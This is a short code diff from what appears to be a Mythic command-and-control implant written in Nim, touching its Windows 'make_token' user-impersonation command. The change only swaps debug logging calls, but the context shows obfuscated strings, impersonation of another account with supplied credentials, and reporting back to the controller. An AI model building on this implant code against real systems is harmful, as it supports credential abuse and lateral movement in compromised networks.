@@ -28,7 +28,7 @@ when defined(windows):
       if password.len == 0:
         return mythicError(taskId, obf("Password cannot be empty"))
       
-      debug &"[DEBUG] make_token: user={domain}\\{username}, netOnly={netOnly}"
+      debugLog "make_token", &"make_token: user={domain}\\{username}, netOnly={netOnly}"
       
       # Convert strings to wide strings
       let usernameW = +$username
@@ -65,7 +65,7 @@ when defined(windows):
       # Get the new user context (after impersonation)
       let newUser = getCurrentUsername()
       
-      debug &"[DEBUG] Successfully impersonated: {newUser}"
+      debugLog "make_token", &"Successfully impersonated: {newUser}"
       
       # Build response with callback data
       return mythicCallback(taskId, obf("Successfully impersonated ") & newUser, %*{
